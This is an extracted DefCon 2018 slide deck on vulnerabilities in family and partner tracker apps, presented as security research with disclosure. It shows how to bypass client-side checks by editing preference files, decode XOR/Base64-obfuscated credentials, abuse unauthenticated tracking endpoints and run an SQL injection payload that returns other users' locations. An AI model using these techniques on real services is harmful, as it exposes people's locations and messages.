All your family secrets belong to us Worrisome security issues in tracker apps
Siegfried Rasthofer | Fraunhofer SIT, Germany Stephan Huber | Fraunhofer SIT, Germany DefCon26, August 11th 2018

Who are we?

Siegfried
§ Head of Department Secure Software Engineering
§ PhD, M.Sc., B.Sc. in computer science § Static and Dynamic Code Analysis § Founder of @TeamSIK and @CodeInspect

Stephan
§ Security Researcher @Testlab Mobile Security
§ Code Analysis Tool development § IOT Stuff § Founder of @TeamSIK

2

Who are we?

Siegfried
§ Head of Department Secure Software Engineering
§ PhD, M.Sc., B.Sc. in computer science § Static and Dynamic Code Analysis § Founder of @TeamSIK and @CodeInspect

Stephan
§ Security Researcher @Testlab Mobile Security
§ Code Analysis Tool development § IOT Stuff § Founder of @TeamSIK

(creds to: Alex, Daniel, Julien, Julius, Michael, Philipp, Steven, Kevin, Sebald, Ben)
3

Team
4

Beer Announcement
5

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
6

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
7

Surveillance - Then

1960: Radio receiver inside pipe

1960: Camera inside a pack of cigarettes

1970: Microphone inside a dragonfly

1990: Microphone inside a fake catfish
* Source: http://www.businessinsider.com/ 8

Surveillance - Now
Sypware/RAT
9

Surveillance - Now

Sypware/RAT

Benign Reasons?
10

Surveillance - Now

Benign Reasons?

Family

Couple

Friends
11

Good vs. Bad
Sypware/RAT

Family

Couple

Friends
12

Surveillance - Apps
Google PlayStore
Android Security Report 2017
13

Surveillance - Apps
Google PlayStore
*Android Security Report 2017 14

How well are the tracking data protected?
15

App Name
Couple Tracker App
My Family GPS Tracker KidControll GPS Tracker Rastrear Celular Por el Numero Phone Tracker By Number Couple Vow Real Time GPS Tracker Ilocatemobile
Family Locator (GPS) Free Cell Tracker Rastreador de Novia Phone Tracker Free Phone Tracker Pro Rastreador de Celular Avanzado
Rastreador de Novia Localiser un Portable avec son Numero
Handy Orten per Handynr
Track My Family

GooglePlay Downloads 5-10 m
1-5m
100-500k
50-100k 10-50k
1k
16

App Name
Couple Tracker App
My Family GPS Tracker KidControll GPS Tracker Rastrear Celular Por el Numero Phone Tracker By Number Couple Vow Real Time GPS Tracker Ilocatemobile
Family Locator (GPS) Free Cell Tracker Rastreador de Novia Phone Tracker Free Phone Tracker Pro Rastreador de Celular Avanzado
Rastreador de Novia Localiser un Portable avec son Numero
Handy Orten per Handynr
Track My Family

GooglePlay Downloads 5-10 m
1-5m
100-500k
50-100k 10-50k
1k
17

Takeaways
It is very easy to... § Enable premium features without paying § Access highly sensitive data of a person § Perform mass surveillance in real-time
18

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
19

How does it work? ­ Very simple

pull

push

Observer

Tracking Provider (backend/cloud)
20

Monitored Person

What kind of data?

pull Observer
21

push Monitored Person

What kind of data?

pull Observer
22

push Monitored Person

Attack Vectors

pull Observer
23

push Monitored Person

Attack Vectors

pull Observer
24

push Monitored Person

Attack Vectors

pull Observer
25

push Monitored Person

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
26

101

1. Authentication Request 2. Authorization Request

27

WTF?
2. Client-Side "Authorization" 1. Request Data
28

WTF 1/4 ­ Enable Premium Features
29

WTF 1/4 ­ Enable Premium Features
N = com.google.android.gms.ads.g; if(!this.n.getBoolean("l_ads", false)) {
... } else {
this.N.setVisibility(View.GONE); }
30

WTF 1/4 ­ Enable Premium Features
N = com.google.android.gms.ads.g;
if(!this.n.getBoolean("l_ads", false)) { ...
} else { this.N.setVisibility(View.GONE);
}
/data/data/com.bettertomorrowapps.spyyourlovefree/ shared_prefs/loveMonitoring.xml
<boolean name="l_location_full" value="false" /> <boolean name="l_fb_full" value="false" /> <boolean name="l_loc" value="false" /> <boolean name="l_sms" value="false" /> <boolean name="l_ads" value="false" /> <boolean name="l_sms_full" value="false" /> <boolean name="l_call" value="false" /> <boolean name="l_fb" value="false" />
31

SharedPreferences Backup/Restore

§ Rooted device:
1. copy loveMonitoring.xml from app folder to pc 2. modify file, set false to true 3. copy back and overwrite orig. file with modified file
§ Unrooted device:

adb backup adb restore

adb tool

convert *

modify file

*https://github.com/nelenkov/android-backup-extractor

WTF 1/4 ­ Enable Premium Features
/data/data/com.bettertomorrowapps.spyyourlovefree/ shared_prefs/loveMonitoring.xml
<boolean name="l_location_full" value="false" /> <boolean name="l_fb_full" value="false" /> <boolean name="l_loc" value="false" /> <boolean name="l_sms" value="false" /> <boolean name="l_ads" value="false" /> <boolean name="l_sms_full" value="false" /> <boolean name="l_call" value="false" /> <boolean name="l_fb" value="false" />
33

WTF 1/4 ­ Enable Premium Features
/data/data/com.bettertomorrowapps.spyyourlovefree/ shared_prefs/loveMonitoring.xml
<boolean name="l_location_full" value="false" /> <boolean name="l_fb_full" value="false" /> <boolean name="l_loc" value="false" /> <boolean name="l_sms" value="false" /> <boolean name="l_ads" value="false" /> <boolean name="l_sms_full" value="false" /> <boolean name="l_call" value="false" /> <boolean name="l_fb" value="false" />
34

WTF 1/4 ­ Enable Premium Features
1. Give me all SMS messages
35

WTF 1/4 ­ Enable Premium Features
1. Give me all SMS messages 2. Ok: SMS1, SMS2, SMS3, ...
36

WTF 1/4 ­ Enable Premium Features
3. Client "Authorization" Check
if(getBoolean("l_sms_full") == false) { String[] sms = getAllSMS(); ... singleSMS = sms[i].substring(0, 50);
} else {
//return complete sms }
1. Give me all SMS messages
2. Ok: SMS1, SMS2, SMS3, ...
37

WTF 1/4 ­ Enable Premium Features
3. Client "Authorization" Check
if(getBoolean("l_sms_full") == false) { String[] sms = getAllSMS(); ... singleSMS = sms[i].substring(0, 50);
} else {
//return complete sms }
1. Give me all SMS messages
2. Ok: SMS1, SMS2, SMS3, ...
38

WTF 2/4 ­ Admin Privileges · App supports two modes:
· parent (controller/administration) · children (monitored)
· Administrator can create new Administrators · Administrator can monitor all children
39

WTF 2/4 ­ Admin Privileges
· App supports two modes:
· parent (controller/administration) · children (monitored)
· Administrator can create new Administrators · Administrator can monitor all children
????
40

WTF 2/4 ­ Admin Privileges
· App supports two modes:
· parent (controller/administration) · children (monitored)
· Administrator can create new Administrators · Administrator can monitor all children
<boolean name="isLogin" value="true" /> <boolean name="isParent" value="true" />
41

WTF 3/4 - Remove Lockscreen
42

WTF 3/4 - Remove Lockscreen § After app start the lock screen asks for pin
????
43

Remove Lockscreen § After app start the lock screen asks for pin § To remove the lock screen, change SharedPreference value from
true to false
<boolean name="pflag" value="true" />
<boolean name="pflag" value="false" />
44

WTF 4/4 ­ Authentication Bypass § Same works with login, no password required
<boolean name="isLogin" value="false" /> <boolean name="isLogin" value="true" />
45

Do not use SharedPreferences for authorization checks!!
46

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
47

Mitm Attack 101
DATA user/app

DATA
tracking provider (backend/cloud)

Mitm Attack 101

DATA user/app

DATA

DATA
tracking provider (backend/cloud)

Mitm Attack 101

DATA user/app

DATA

DATA
tracking provider (backend/cloud)

Mitm Attack 101

DATA user/app

DATA

DATA
tracking provider (backend/cloud)

Mitm Attack 101

DATA user/app

DATA

DATA
tracking provider (backend/cloud)

Mitm Attack 101

DATA user/app

DATA

DATA
tracking provider (backend/cloud)

Mitm Attack 101

DATA user/app

DATA

DATA
tracking provider (backend/cloud)

Mitm Attack 101
user/app

tracking provider (backend/cloud)

Mitm Attack 101

user/app

evil twin

tracking provider (backend/cloud)

Mitm Attack 101

victims view

user/app

evil twin

tracking provider (backend/cloud)

Mitm Attack 101

user/app

victims view

DATA

DATA

evil twin

DATA

DATA

DATA

tracking provider (backend/cloud)

Mitm + Bad Crypto + Obfuscation
??
59

Mitm + Bad Crypto + Obfuscation

user@example.com

??

secure123

60

Mitm + Bad Crypto + Obfuscation
http://s9.***********.com/login/?aaa...
GET /login/?aaa=Bi9srqo&nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A HTTP/1.1
61

Mitm + Bad Crypto + Obfuscation

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

user@example.com secure123

62

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

63

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

64

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

GET /login/?
aaa=ZTZrO&
4. mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_ HTTP/1.1

65

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

GET /login/?
aaa=ZTZrO&
4. mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_ HTTP/1.1

66

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

GET /login/?
aaa=ZTZrO&
4. mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_ HTTP/1.1

67

Mitm + Bad Crypto + Obfuscation
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A
ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A
mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A
68

aaa=Bi9srqo
eml=4hBWVqJg4D
psw=-ZI-WQe
aaa=ZTZrO data=5JFJzgYW_

Mitm + Bad Crypto + Obfuscation

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
69

tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

Mitm + Bad Crypto + Obfuscation
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'}

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
70

tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'}

XOR

Base64

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
71

tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'}

{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}

XOR
Base64

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
72

tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'}

XOR
{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}

Random() + "="

+

Base64

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
73

tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'}

******** secure123

XOR
{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}

Random() + "="

+

Base64

{df, ssp, fgh, drt, tnd, rfb, rma, vwe, hac}

+

"=" + Random()

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
74

tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A ssp = CFF1CxQoaQcoLWoRaQ%3D%3D%0A rma = CFF1CxQoaQcoLWoRaQ%3D%3D%0A df = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

Decryption

Decode Base64
DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

CFF1CxQoaQcoLWoRaQ%3D%3D%0A

75

Decryption
@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'}

******** secure123

XOR

Decode Base64
DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

CFF1CxQoaQcoLWoRaQ%3D%3D%0A

76

Mitm + Bad Crypto + Obfuscation
@
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

********
tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

77

Mitm + Bad Crypto + Obfuscation
@
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

********
tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

aaa=Bi9srqo

eml=4hBWVqJg4D
78

psw=-ZI-WQe

aaa=ZTZrO data=5JFJzgYW_

Mitm + Bad Crypto + Obfuscation
@
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

********
tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

{usr, psw, uid, data, eml, pss, foo, clmn, count, nam, srv, answ, aaa }

Random() + "="

+

GenerateRandomString()

aaa=Bi9srqo

eml=4hBWVqJg4D
79

psw=-ZI-WQe

aaa=ZTZrO data=5JFJzgYW_

Mitm + Bad Crypto + Obfuscation
@
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

********
tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

{usr, psw, uid, data, eml, pss, foo, clmn, count, nam, srv, answ, aaa }

Random() + "="

+

GenerateRandomString()

GenerateMultiPairs()

aaa=Bi9srqo

eml=4hBWVqJg4D
80

psw=-ZI-WQe

aaa=ZTZrO data=5JFJzgYW_

Mitm + Bad Crypto + Obfuscation
@
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A

********
tnd = CFF1CxQoaQcoLWoRaQ%3D%3D%0A

aaa=Bi9srqo

Shuffle()
GET /login/? aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A HTTP/1.1
81

82

Correct Secure Communication

§ Use https via TLS 1.2 or TLS 1.3 § Valid server certificate § Implementation in Android:

Java:
URL url = new URL("https://wikipedia.org"); URLConnection urlConnection = url.openConnection();

Kotlin:
val url = URL("https://wikipedia.org") val urlConnection: URLConnection = url.openConnection()

https://dev eloper. android. com/training/articles/secu rity -ssl#jav a

Realy ?
84

"Authentication"

"Authentication"
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection(
); try { ...

"Authentication"
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

"Authentication"
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...
database address

"Authentication"

... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

database address

username

password

"Authentication"

... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

database address

username

password

"Authentication"

§ MySQL Database with following table scheme:

Field

Type

Null

Key

nome

varchar(50) NO

email

varchar(30) NO

latitude

varchar(30) NO

longitude varchar(30) NO

data

varchar(30) NO

hora

varchar(30) NO

codrenavam varchar(30) NO

placa

Varchar(30) NO

PRI

Default NULL NULL NULL NULL NULL NULL NULL NULL

Extra

"Authentication"

§ MySQL Database with following table scheme:

Field

Type

Null

Key

nome

varchar(50) NO

email

varchar(30) NO

latitude

varchar(30) NO

longitude varchar(30) NO

data

varchar(30) NO

hora

varchar(30) NO

codrenavam varchar(30) NO

placa

Varchar(30) NO

PRI

Default NULL NULL NULL NULL NULL NULL NULL NULL

Extra

"Authentication"

§ MySQL Database with following table scheme:

Field

Type

Null

Key

nome

varchar(50) NO

email

varchar(30) NO

latitude

varchar(30) NO

longitude varchar(30) NO

data

varchar(30) NO

hora

varchar(30) NO

codrenavam varchar(30) NO

placa

Varchar(30) NO

PRI

Default NULL NULL NULL NULL NULL NULL NULL NULL

Extra

"Authentication"

... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

database address

username

password

All in all we had access to over 860.000 location data of different user, distributed over the whole world.

Prepared Statement ? WTF !
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");

Is that all ?
96

Prepared Statement ? WTF !
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)"); prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "', '" + this.atributos.getEmail() + "', '" + this.atributos.getLatitudeStr() + "', '" + this.atributos.getLongitudeStr() + "', '" + this.atributos.getDataBancoStr() + "', '" + this.atributos.getHoraBancoStr() + "', '" + this.atributos.getRenavam() + "', '" + this.atributos.getPlaca() + "')");
prest.close(); con.close(); ...

Prepared Statement ? WTF !
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)"); prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "', '" + this.atributos.getEmail() + "', '" + this.atributos.getLatitudeStr() + "', '" + this.atributos.getLongitudeStr() + "', '" + this.atributos.getDataBancoStr() + "', '" + this.atributos.getHoraBancoStr() + "', '" + this.atributos.getRenavam() + "', '" + this.atributos.getPlaca() + "')");
prest.close(); con.close(); ...

Stupid !
99

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
100

101

1. Authentication Request 2. Authorization Request

101

WTF-States of Server-Side Vulnerabilties
102

" Thats a feature "
103

Not a Bug it`s a Feature § Web service provides public access to user tracks, allow all by default

Not a Bug it`s a Feature § Web service provides public access to user tracks, allow all by default

Not a Bug it`s a Feature
https://www.greenalp.com/realtimetracker/index.php?viewuser=USERNAME

Demo Time !
107

Is that all ?
108

Public Webinterface

Authentication ­ What?
110

Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0& currentdate=07/12/2017

Part1: Who Needs Authentication?
nothing new http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0& currentdate=07/12/2017

Part1: Who Needs Authentication?

nothing new

your user id

http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0& currentdate=07/12/2017

Part1: Who Needs Authentication?

nothing new

your user id

http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0& currentdate=07/12/2017
id of the person to track

Part1: Who Needs Authentication?

nothing new

your user id

http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0& currentdate=07/12/2017

requested date

id of the person to track

Part1: Who Needs Authentication?

attacker

Response for http://***********g.azurewebsites.net/...
07:47 PM*49.8715330929084,8.639047788304 07:52 PM*49.8731935027927,8.63498598738923 07:53 PM*49.871533247265,8.63904788614738 ...

tracker backend

List of the complete track

Part1: Who Needs Authentication?

Part2: Who Needs Authentication?
§ Tracker has messenger functions, e.g. send messages or exchange images
§ How do we get the messages for a user ?

Part2: Who Needs Authentication?
§ Tracker has messenger functions, e.g. send messages or exchange images
§ How do we get the messages for a user ?

attacker

POST /***************/api/get_sms HTTP/1.1 {"cnt":"100","user_id":"123456"} result counter

tracker backend

Part2: Who Needs Authentication?
§ Tracker has messenger functions, e.g. send messages or exchange images
§ There is no authentication, all messages !

attacker

List of sms with:
· user_id · timestamp · content · phone number

tracker backend

Part2: Who Needs Authentication? § What happens if user_id is empty ?

attacker

POST /***************/api/get_sms HTTP/1.1 {"cnt":"100","user_id":""}

tracker backend

Part2: Who Needs Authentication? § What happens if user_id is empty ?

attacker

All SMS of all users !

tracker backend

SQL ­ Very Simple
123

Backend Attack to Track all User
Backend API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=<mobile number>

Backend Attack to Track all User
Backend API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=<mobile number>
[{"to_username":"*****","to_mobile":"9********9","lat":"*0.2916455"," lon":"7*.0521764","time":"12:0,27-12-2016"}]

Simple SQL Injection
Backend API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='

Simple SQL Injection
Backend API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
[{"to_username":"***","to_mobile":"9********4","lat":"2*.644490000000005","lon":"*8.35368","time":"18:55,04-122016"},{"to_username":"****","to_mobile":"9******9","lat":"*0.2916455","lon":"*8.0521764","time":"12:0,27-122016"},{"to_username":"****","to_mobile":"9********2","lat":"*3.8710253","lon":"*5.6093338","time":"18:6,19-112016"},{"to_username":"****","to_mobile":"9*******2","lat":"*6.5958902","lon":"-*7.3897167","time":"13:46,04-122016"},{"to_username":"****","to_mobile":"9*******0","lat":"*2.621241065689713","lon":"*8.33497756126259","time":"9:2 5,20-11-2016"},{"to_username":"****","to_mobile":"4********1","lat":"*1.8925267","lon":"-*1.3928747","time":"3:26,12022017"},{"to_username":"","to_mobile":"","lat":"","lon":"","time":""},{"to_username":"***","to_mobile":"9********8", "lat":"*5.262387837283313","lon":"*4.10851701162755","time":"23:47,20-112016"},{"to_username":"****","to_mobile":"9*******6","lat":"0","lon":"0","time":"12:35"},{"to_username":"***","to_mob ile":"8********5","lat":"*5.3401165","lon":"*5.1459643","time":"8:45,21-112016"},{"to_username":"****","to_mobile":"8********8","lat":"0","lon":"0","time":"0:32"},{"to_username":"****","to_mo 